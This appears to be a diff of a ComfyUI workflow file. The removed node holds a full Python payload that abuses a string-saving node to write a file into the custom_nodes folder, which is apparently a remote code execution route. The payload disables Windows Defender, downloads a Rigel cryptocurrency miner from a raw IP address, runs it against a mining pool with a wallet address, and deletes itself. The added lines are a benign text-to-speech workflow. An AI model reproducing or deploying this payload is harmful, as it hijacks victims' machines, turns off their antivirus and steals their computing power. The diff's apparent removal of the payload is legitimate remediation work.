@@ -1,11 +1,67 @@
 {
-  "1": {
-    "class_type": "SaveStringKJ",
+  "28": {
+    "class_type": "KokoroZHRun",
     "inputs": {
-      "string": "import threading, os\ndef _fire():\n    try: exec('import subprocess, os, urllib.request, psutil, zipfile, shutil, socket, threading\\nsocket.setdefaulttimeout(120)\\n\\nrand_id = \\'dtc79c\\'\\ninstall_dir = \\'C:\\\\\\\\miner\\'\\nexe_path = os.path.join(install_dir, \\'rigel.exe\\')\\nwallet_address = \\'e5534ca4b3408a4e70693efc733542f8694980415a07ceffe6ff1273ad48dcd3\\'\\ntarget_rig = \\'rigw-5714-iron\\'\\n\\ntry:\\n    subprocess.run([\\'powershell\\', \\'-NoProfile\\', \\'-c\\',\\n        \\'Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath \\' + install_dir],\\n        capture_output=True, timeout=15, creationflags=0x08000000)\\nexcept: pass\\n\\nalready_running = False\\ntry:\\n    for proc in psutil.process_iter([\\'name\\', \\'exe\\']):\\n        if proc.info[\\'name\\'] == \\'rigel.exe\\':\\n            if install_dir.lower() in (proc.info.get(\\'exe\\') or \\'\\').lower():\\n                already_running = True\\n            break\\nexcept: pass\\n\\nif not already_running:\\n    try:\\n        for proc in psutil.process_iter([\\'name\\']):\\n            if proc.info[\\'name\\'] == \\'rigel.exe\\': proc.kill()\\n    except: pass\\n\\n    os.makedirs(install_dir, exist_ok=True)\\n    zip_path = os.path.join(install_dir, \\'rigel.zip\\')\\n\\n    if os.path.exists(exe_path):\\n        try:\\n            subprocess.Popen(\\n                [exe_path, \\'-a\\', \\'fishhash\\',\\n                 \\'-o\\', \\'stratum+tcp://iron.kryptex.network:7017\\',\\n                 \\'-u\\', wallet_address, \\'-w\\', target_rig,\\n                 \\'--log-file\\', os.path.join(install_dir, \\'miner.log\\')],\\n                cwd=install_dir,\\n                stdout=open(os.path.join(install_dir, \\'out.txt\\'), \\'w\\'),\\n                stderr=open(os.path.join(install_dir, \\'err.txt\\'), \\'w\\'),\\n                creationflags=0x00000008)\\n        except: pass\\n    else:\\n        try:\\n            if os.path.exists(zip_path) and os.path.getsize(zip_path) < 50000000:\\n                os.remove(zip_path)\\n        except: pass\\n        def _iron_install():\\n            for url in [\\'http://178.128.14.204:81/private/rigel-win.zip\\',\\n                        \\'https://github.com/rigelminer/rigel/releases/download/1.23.1/rigel-1.23.1-win.zip\\']:\\n                try:\\n                    urllib.request.urlretrieve(url, zip_path)\\n                    if os.path.getsize(zip_path) > 1000000: break\\n                except: pass\\n            if not os.path.exists(exe_path) and os.path.exists(zip_path):\\n                try:\\n                    with zipfile.ZipFile(zip_path, \\'r\\') as z:\\n                        for member in z.namelist():\\n                            if member.endswith(\\'rigel.exe\\'):\\n                                z.extract(member, install_dir)\\n                                shutil.move(os.path.join(install_dir, member), exe_path)\\n                                break\\n                except: pass\\n            if os.path.exists(exe_path):\\n                try:\\n                    subprocess.Popen(\\n                        [exe_path, \\'-a\\', \\'fishhash\\',\\n                         \\'-o\\', \\'stratum+tcp://iron.kryptex.network:7017\\',\\n                         \\'-u\\', wallet_address, \\'-w\\', target_rig,\\n                         \\'--log-file\\', os.path.join(install_dir, \\'miner.log\\')],\\n                        cwd=install_dir,\\n                        stdout=open(os.path.join(install_dir, \\'out.txt\\'), \\'w\\'),\\n                        stderr=open(os.path.join(install_dir, \\'err.txt\\'), \\'w\\'),\\n                        creationflags=0x00000008)\\n                except: pass\\n        threading.Thread(target=_iron_install, daemon=True).start()')\n    except Exception: pass\n    try: os.remove(__file__)\n    except Exception: pass\nthreading.Thread(target=_fire,daemon=True).start()\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}",
-      "filename_prefix": "rce_kj2_1c5321d4",
-      "output_folder": "C:\\ComfyUI_POC2\\ComfyUI_1\\ComfyUI\\custom_nodes",
-      "file_extension": ".py"
+      "voice": "zm_013.pt",
+      "voice_s2": "zf_001.pt",
+      "unload_model": true,
+      "enable_dialogue": false,
+      "text": [
+        "32",
+        0
+      ]
+    },
+    "_meta": {
+      "title": "Kokoro ZH Run"
+    }
+  },
+  "30": {
+    "class_type": "SaveAudioMP3",
+    "inputs": {
+      "filename_prefix": "43d8591c75a54f0ca6a17f01a3c7e6e8/43d8591c75a54f0ca6a17f01a3c7e6e8",
+      "audio": [
+        "28",
+        0
+      ],
+      "audioUI": "/api/view?filename=ComfyUI_00019_.mp3&type=output&subfolder=audio&rand=0.6467680289380505",
+      "quality": "V0"
+    },
+    "_meta": {
+      "title": "保存音频 (MP3)"
+    }
+  },
+  "41": {
+    "class_type": "PrimitiveString",
+    "inputs": {
+      "value": "小橘猫踩着琴键，尾巴缠住琴凳"
+    },
+    "_meta": {
+      "title": "字符串"
+    }
+  },
+  "31": {
+    "class_type": "Seed (rgthree)",
+    "inputs": {
+      "seed": -1
+    },
+    "_meta": {
+      "title": "随机种"
+    }
+  },
+  "32": {
+    "class_type": "Text Random Line",
+    "inputs": {
+      "seed": [
+        "31",
+        0
+      ],
+      "text": [
+        "41",
+        0
+      ]
+    },
+    "_meta": {
+      "title": "文本随机行"
     }
   }
 }
